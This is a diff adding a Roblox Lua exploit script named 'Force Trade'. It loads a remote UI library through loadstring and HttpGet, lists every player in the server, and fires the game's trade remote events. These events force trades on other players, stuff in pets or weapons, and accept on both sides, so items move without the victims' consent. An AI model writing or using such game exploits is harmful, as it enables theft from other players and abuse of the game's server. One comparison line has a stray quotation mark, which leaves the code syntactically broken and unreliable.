@@ -1,0 +1,40 @@
+ local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/kwykvt9vtf/Kams-UI-Library/main/source.lua"))()
+    local Window = Library.CreateLib("Force Trade By kams the goat again ;)", "BloodTheme")
+    
+    
+    --main tab
+    local main = Window:NewTab("Main")
+    local sec = main:NewSection("Force Trade")
+    for i , k in pairs(game.Players:GetChildren())do
+        sec:NewButton(k.Name, "Person", function()
+    --prompt
+    
+    game:GetService("ReplicatedStorage").GameClient.Events.RemoteEvent.PromptTradeAccept:FireServer(k.Name)
+    wait(.2)
+    game:GetService("ReplicatedStorage").GameClient.Events.RemoteEvent.DeclineTrade:FireServer(k.Name,"Accept")
+    wait(.2)
+    --place weapons
+    
+    for i , v in pairs(game:GetService("Workspace").Pets.ServerPets:GetDescendants())do
+        if v.Name == WeaponName" then
+       wait()    
+
+game:GetService("ReplicatedStorage").GameClient.Events.RemoteFunction.AddPetToTrade:InvokeServer(k.Name,"Add",{["PetID"] = v.Parent.Name,["PetName"] = v.Value})
+        
+    end
+    end
+    
+    
+    
+    
+    
+    
+    wait(.2)
+    
+    --accepte
+    game:GetService("ReplicatedStorage").GameClient.Events.RemoteEvent.AcceptDeclineTrade:FireServer(k.Name,"Accept")
+    wait(.5)
+    game:GetService("ReplicatedStorage").GameClient.Events.RemoteEvent.AcceptDeclineTrade:FireServer(game.Players.LocalPlayer.Name,"Accept")
+    wait(.5)
+    end)
+        end
